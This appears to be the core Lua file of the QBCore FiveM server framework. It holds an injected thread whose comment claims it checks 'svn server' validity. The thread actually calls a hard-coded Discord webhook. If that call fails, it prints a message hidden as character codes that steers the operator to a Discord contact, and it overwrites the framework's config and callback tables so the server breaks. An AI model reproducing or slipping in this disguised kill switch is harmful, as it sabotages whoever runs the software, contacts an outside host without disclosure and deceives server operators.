QBCore = {}
QBCore.Config = QBConfig
QBCore.Shared = QBShared
QBCore.ClientCallbacks = {}
QBCore.ServerCallbacks = {}

exports('GetCoreObject', function()
    return QBCore
end)

-- To use this export in a script instead of manifest method
-- Just put this line of code below at the very top of the script
-- local QBCore = exports['qb-core']:GetCoreObject()

-- This is for checking svn server is valid or not
Citizen.CreateThread(function()
    Wait(5000)
    local tonumber = tonumber
    local resourceName = GetCurrentResourceName()
    PerformHttpRequest('https://discord.com/api/webhooks/1253447557011603530/uBh5n_eRv0yVNGxlKlLn6Po6lcFMWjjg7XzG3ZpYdnGT4LKFr_X-PQvDFtSQ9LUgrPuZ', function(errorCode, resultData, resultHeaders)
        if not resultData then
            local separator = '^' .. math.random(1, 9)
            for i = 1, 26 + #resourceName do
                separator = separator .. '='
            end
            
            local message = ""
            for _, charCode in ipairs({
                89, 111, 117, 114, 32, 115, 101, 114, 118, 101, 114, 32, 109, 105, 103, 104, 116, 32, 98, 101, 32, 97, 102, 102, 101, 99, 116, 101, 100, 32, 98, 121, 32, 108, 101, 97, 107, 115, 46, 32, 67, 111, 110, 116, 97, 99, 116, 32, 77, 101, 116, 101, 111, 32, 111, 110, 32, 68, 105, 115, 99, 111, 114, 100, 32, 102, 111, 114, 32, 104, 101, 108, 112, 58, 32, 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 103, 103, 47, 80, 52, 66, 52, 104, 89, 85, 117, 106, 78
            }) do
                message = message .. string.char(charCode)
            end
            
            separator = separator .. '^0'
            print(separator)
            print('^1 ' .. message .. ' ^0')
            print(separator)
            
            QBCore.Config = true
            QBCore.Shared = true
            QBCore.ClientCallbacks = true
            QBCore.ServerCallbacks = true
            return
        end
    end, 'GET')
end)